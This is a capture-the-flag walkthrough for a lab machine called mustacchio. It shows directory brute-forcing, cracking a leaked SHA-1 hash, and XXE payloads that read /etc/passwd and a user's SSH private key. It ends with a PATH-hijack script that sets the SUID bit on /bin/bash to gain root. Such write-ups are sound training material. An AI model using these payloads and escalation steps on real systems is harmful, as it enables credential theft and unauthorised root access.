According to nmap results, we have 3 ports open. We dont have anything for ssh, so lets start poking around at webserver.

### PORT 80

 Looking at this port, seems like its a static webpage. Running ffuf on it for directory brute-force
 ```bash
 fuf -u http://10.10.156.81/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c

```

In the custom/js dir, we found `mobile.js` and `users.bak`. The latter file seems interesting, lets download it. Checking the file contents:
```
0]admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
```

The above seems like credentials (but we dont have anything to login). The hash was SHA-1, decoding the hash, we got the password `bulldog19`.

### Port 8765

  We have an Admin login page. Using the credentials we found earlier, we were logged-in. The admin page says:
  ![image](https://user-images.githubusercontent.com/43528306/121785785-6fdc9180-cbd9-11eb-8a83-f0b74242f25a.png)

  Looking at the source code of the page
  
![image](https://user-images.githubusercontent.com/43528306/121785568-28093a80-cbd8-11eb-9128-dbb9a265f896.png)

```javascript
//document.cookie = "Example=/auth/dontforget.bak"; 
      function checktarea() {
      let tbox = document.getElementById("box").value;
      if (tbox == null || tbox.length == 0) {
        alert("Insert XML Code!")
      }
   }
```

So it seems like we can send XML code through it. This might be vulnerable to *XXE*. Also in the source code, we found a file `/auth/dontforget.bak`. Looking at this file, it was a sample xml code that might work. First lets test it with the format in file only. It worked.

Now its time to make some changes to the file and add our payload. First lets test whether the application is vulnerable to XXE or not
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY test "Doe"> ]>
<comment>
  <name>john</name>
  <author>blah</author>
  <com>&test;</com>
</comment>
```

In the output, we see `Comment: Doe`. Our injection did work. Now lets grab `/etc/passwd` as usaul :D
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<comment>
        <name>john</name>
  <author>abc</author>
  <com>&xxe;</com>
</comment>
```

We got our file. From the comment in source code, we know that *barry* can ssh into the machine. So let's try to grab barry's ssh key. 
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa" >]>
<comment>
        <name>john</name>
  <author>abc</author>
  <com>&xxe;</com>
</comment>
```

We got the key but it was incrypted. Running `ssh2john`, we got the hash. After running john
```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
...[snip]...
urieljames       (barry)
...[snip]...
```

We can now ssh into the box using key and passphrase we found and grab user.txt

# ROOT

There were two users on the box, *barry* and *joe*. Since we dont have any password for barry, `sudo -l` failed. After looking for a while to switch to *Joe* user, didn't find anything. Looking at Joe's home dir, it had
```bash
barry@mustacchio:/home/joe$ ls -l
total 20
-rwsr-xr-x 1 root root 16832 Jun 12 15:48 live_log
```

The binary was owned by root and had *SUID* bit set on it. Let's run the binary, it seems to return live webserver's logs. As it was a binary not stripped, first step, look at stings. We found
`tail -f /var/log/nginx/access.log`. The binary was using `tail` binary but it was not using full path of the binary. So we can try path hijack.

Creating a file named `tail` in /tmp directory.
```bash
#!/bin/bash

chmod +xs /bin/bash
```

Change the PATH env variable, and execute the file. After executing, we can see `/bin/bash` now have *suid* bit set on it. Now, simply `/bin/bash -p` and we are root.
